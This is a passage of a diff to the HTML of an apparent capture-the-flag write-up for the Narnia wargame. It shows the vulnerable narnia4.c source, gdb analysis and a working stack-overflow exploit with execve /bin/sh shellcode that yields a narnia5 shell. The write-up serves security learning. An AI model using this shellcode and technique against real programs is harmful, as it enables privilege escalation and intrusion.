+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;set&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*31&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;
+&lt;span class="n"&gt;Starting&lt;/span&gt; &lt;span class="n"&gt;program&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;games&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia3&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;`python -c &amp;#39;print &amp;quot;&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;*31&amp;#39;`&amp;quot;&lt;/span&gt;
+&lt;span class="n"&gt;error&lt;/span&gt; &lt;span class="n"&gt;opening&lt;/span&gt; &lt;span class="n"&gt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -676,19 +676,19 @@ narnia4@melinda:/narnia&lt;span class="nv"&gt;$ &lt;/span&gt;cat narnia4.c
 &lt;span class="c"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
 &lt;span class="c"&gt;#include &amp;lt;ctype.h&amp;gt;&lt;/span&gt;
 
-extern char **environ&lt;span class="p"&gt;;&lt;/span&gt;
+extern char **environ;
 
 int main&lt;span class="o"&gt;(&lt;/span&gt;int argc,char **argv&lt;span class="o"&gt;){&lt;/span&gt;
-  int i&lt;span class="p"&gt;;&lt;/span&gt;
-  char buffer&lt;span class="o"&gt;[&lt;/span&gt;256&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  int i;
+  char buffer&lt;span class="o"&gt;[&lt;/span&gt;256&lt;span class="o"&gt;]&lt;/span&gt;;
 
-  &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt; environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; NULL&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;)&lt;/span&gt;
-    memset&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;, strlen&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0; environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; NULL; i++&lt;span class="o"&gt;)&lt;/span&gt;
+    memset&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;, strlen&lt;span class="o"&gt;(&lt;/span&gt;environ&lt;span class="o"&gt;[&lt;/span&gt;i&lt;span class="o"&gt;]))&lt;/span&gt;;
 
   &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;argc&amp;gt;1&lt;span class="o"&gt;)&lt;/span&gt;
-    strcpy&lt;span class="o"&gt;(&lt;/span&gt;buffer,argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    strcpy&lt;span class="o"&gt;(&lt;/span&gt;buffer,argv&lt;span class="o"&gt;[&lt;/span&gt;1&lt;span class="o"&gt;])&lt;/span&gt;;
 
-  &lt;span class="k"&gt;return&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt;
+  &lt;span class="k"&gt;return &lt;/span&gt;0;
 &lt;span class="o"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -710,7 +710,7 @@ int main&lt;span class="o"&gt;(&lt;/span&gt;int argc,char **argv&lt;span class="
 Reading symbols from /games/narnia/narnia4...&lt;span class="o"&gt;(&lt;/span&gt;no debugging symbols found&lt;span class="o"&gt;)&lt;/span&gt;...done.
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;set &lt;/span&gt;disassembly-flavor intel
 &lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
-Dump of assembler code &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="k"&gt;function&lt;/span&gt; main:
+Dump of assembler code &lt;span class="k"&gt;for function &lt;/span&gt;main:
    0x08048444 &amp;lt;+0&amp;gt;: push   ebp
    0x08048445 &amp;lt;+1&amp;gt;: mov    ebp,esp
    0x08048447 &amp;lt;+3&amp;gt;: push   edi
@@ -728,7 +728,7 @@ End of assembler dump.
 
 &lt;p&gt;We put a breakpoint right before the Stack ends:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; b *main+182
-Breakpoint &lt;span class="m"&gt;1&lt;/span&gt; at 0x80484fa
+Breakpoint 1 at 0x80484fa
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -769,7 +769,7 @@ Starting program: /games/narnia/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 &lt;p&gt;Taking a look at the information of the frame gives us the return address, from which we find the size of the Stack:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; i f
 Stack level 0, frame at 0xffffd5e0:
- &lt;span class="nv"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80484fa in main&lt;span class="p"&gt;;&lt;/span&gt; saved eip 0xf7e404b3
+ &lt;span class="nv"&gt;eip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0x80484fa in main; saved eip 0xf7e404b3
  Arglist at 0xffffd5d8, args:
  Locals at 0xffffd5d8, Previous frame&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s sp is 0xffffd5e0
  Saved registers:
@@ -784,28 +784,28 @@ Stack level 0, frame at 0xffffd5e0:
 &lt;p&gt;Now we have some freedom to choose where to place our shellcode. Let's say, we place it somewhere in the middle, say, at the position 134. In the memory, we get: &lt;code&gt;0xffffd5cc - 134 = 0xffffd546&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Since 276 minus 134 is 142, if we point the return address to   &lt;strong&gt;0xffffd546&lt;/strong&gt;, it will go to the 142th position in the Stack and execute whatever is there. We want to make sure that the return address will always end in the shellcode address and for this reason we fill the addresses around with NOPs.&lt;/p&gt;
 &lt;p&gt;We will borrow the shellcode from the previous levels, which has size of 25 bytes:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x31&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xc0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x73&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x68&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x2f&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x62&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x69&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x6e&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe3&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe2&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x50&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x89&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xe1&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xb0&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x0b&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;xcd&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="n"&gt;x80&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Considering the values above, we can write the following exploit:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;`python -c &amp;quot;print &amp;#39;\x90&amp;#39;*142 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;A&amp;#39;*105 + &amp;#39;\x46\xd5\xff\xff&amp;#39;&amp;quot;`
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*142 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*105 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x46\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We could have used another address to craft another version of the exploit. Then we would have to simply adjust our NOPs and our paddings. For example, &lt;code&gt;0xffffd5cc - 120 = 0xffffd554&lt;/code&gt;:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;`print -c &amp;quot;&amp;#39;\x90&amp;#39;*156 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;\x54\xd5\xff\xff&amp;#39;&amp;quot; `
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;They both work.&lt;/p&gt;
 &lt;p&gt;We finally apply our exploit:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;narnia4@melinda:/tmp$ python -c &amp;quot;print &amp;#39;\x90&amp;#39;*156 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;\x54\xd5\xff\xff&amp;#39;&amp;quot;
-������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��P��P���
-              AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT���
-narnia4@melinda:/tmp$ /narnia/narnia4 `python -c &amp;quot;print &amp;#39;\x90&amp;#39;*156 + &amp;#39;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;\x54\xd5\xff\xff&amp;#39;&amp;quot;`
-$ whoami
-narnia5
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;narnia4&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;
+&lt;span class="err"&gt;������������������������������������������������������������������������������������������������������������������������������������������������������������&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="err"&gt;�&lt;/span&gt;&lt;span class="n"&gt;Ph&lt;/span&gt;&lt;span class="c1"&gt;//shh/bin��P��P���&lt;/span&gt;
+              &lt;span class="n"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAT&lt;/span&gt;&lt;span class="err"&gt;���&lt;/span&gt;
+&lt;span class="n"&gt;narnia4&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;melinda&lt;/span&gt;&lt;span class="o"&gt;:/&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;narnia4&lt;/span&gt; &lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;print &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x90&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;*156 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80&lt;/span&gt;&lt;span class="s"&gt;&amp;#39; + &amp;#39;A&amp;#39;*91 + &amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\x54\xd5\xff\xff&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;whoami&lt;/span&gt;
+&lt;span class="n"&gt;narnia5&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
